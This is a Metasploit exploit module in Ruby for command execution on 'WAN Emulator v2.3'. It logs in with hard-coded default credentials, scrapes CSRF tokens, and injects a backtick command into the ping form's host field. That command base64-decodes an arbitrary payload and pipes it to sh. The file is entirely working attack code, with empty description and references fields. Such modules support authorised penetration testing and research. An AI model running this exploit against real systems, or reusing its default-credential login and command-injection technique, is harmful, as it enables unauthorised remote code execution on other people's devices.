# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;WAN Emulator v2.3 Command Execution&#039;,
      &#039;Description&#039;    => %q{
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Privileged&#039;     => true,
      &#039;Platform&#039;       => &#039;unix&#039;,
      &#039;Arch&#039;           => ARCH_CMD,
      &#039;Author&#039;         =>
        [
          &#039;Brendan Coles <bcoles[at]gmail.com>&#039;, # Discovery and exploit
        ],
      &#039;References&#039;     =>
        [
        ],
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039;       => 1024,
          &#039;BadChars&#039;    => "",
          &#039;DisableNops&#039; => true,
          #&#039;Compat&#039;      =>
          #  {
          #    &#039;PayloadType&#039; => &#039;cmd&#039;,
          #    &#039;RequiredCmd&#039; => &#039;generic netcat netcat-e&#039;,
          #  }
        },
      &#039;DefaultOptions&#039; =>
        {
          &#039;ExitFunction&#039; => &#039;none&#039;
        },
      &#039;Targets&#039;        =>
        [
          [&#039;Automatic Targeting&#039;, { &#039;auto&#039; => true }]
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Aug 12 2012&#039;
    ))
  end

  def exploit
    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;accounts&#039;, &#039;login/&#039;),
    })

    cookie = res.headers[&#039;Set-Cookie&#039;]

    csrf = $1 if res.body =~ / name=&#039;csrfmiddlewaretoken&#039; value=&#039;(.*)&#039; \/><\/div>/

    post = {
      &#039;csrfmiddlewaretoken&#039; => csrf,
      &#039;username&#039; => &#039;d42admin&#039;,
      &#039;password&#039; => &#039;default&#039;,
      &#039;next&#039; => &#039;/&#039;
    }

    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;accounts&#039;, &#039;login/&#039;),
      &#039;vars_post&#039; => post,
      &#039;method&#039; => &#039;POST&#039;,
      &#039;cookie&#039; => cookie
    })

    unless res.code == 302
      fail_with("auth failed")
    end

    cookie = res.headers[&#039;Set-Cookie&#039;]

    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;ping/&#039;),
      &#039;cookie&#039; => cookie
    })

    cookie = res.headers[&#039;Set-Cookie&#039;]
    csrf = $1 if res.body =~ / name=&#039;csrfmiddlewaretoken&#039; value=&#039;(.*)&#039; \/><\/div>/

    post = {
      &#039;csrfmiddlewaretoken&#039; => csrf,
      &#039;pingip&#039; => "www.google.com`echo #{Rex::Text.encode_base64(payload.encoded)}|base64 --decode|sh`",
      &#039;ping&#039; => &#039;&#039;
    }

    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;ping/&#039;),
      &#039;method&#039; => "POST",
      &#039;vars_post&#039; => post,
      &#039;cookie&#039; => cookie
    })
  end
end

